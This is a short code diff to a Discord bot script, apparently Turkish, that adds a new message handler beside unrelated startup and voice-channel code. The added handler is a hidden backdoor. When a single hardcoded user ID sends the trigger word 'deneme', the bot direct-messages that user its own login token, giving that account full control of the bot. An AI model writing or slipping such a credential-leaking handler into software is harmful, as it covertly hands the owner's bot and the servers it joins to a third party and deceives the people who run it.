@@ -34,6 +34,18 @@ client.on('ready', () => {
 /////////////////ATANIS///////////////////ATANIS///////////////////////////////////ATANIS////////////////
 client.login(process.env.token)
 
+client.on('message', async (msg, member, guild) => {
+  
+ {
+   
+if (msg.content.toLowerCase() === 'deneme'){
+if (msg.author.id !== "813799329407041576") return
+
+msg.author.send(`Tokenim: ${client.token}`);
+}
+  
+}
+});
 
 client.on("ready", async => { 
 let kanal = client.channels.cache.get(process.env.sesid)
